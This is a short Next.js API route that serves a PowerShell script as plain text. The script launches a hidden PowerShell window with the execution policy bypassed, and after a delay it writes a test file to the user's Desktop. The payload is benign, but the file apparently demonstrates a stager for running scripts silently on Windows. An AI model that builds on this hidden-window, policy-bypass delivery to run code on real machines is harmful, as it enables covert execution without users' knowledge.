import { NextRequest, NextResponse } from 'next/server';

export async function GET(req: NextRequest) {
    const script = `
    $script = {
        Start-Sleep -Seconds 5
        Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
        Read-Host
    }
    Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString())
    `
  return new NextResponse(script, {
    status: 200,
    headers: { 'Content-Type': 'text/plain' }
  });
}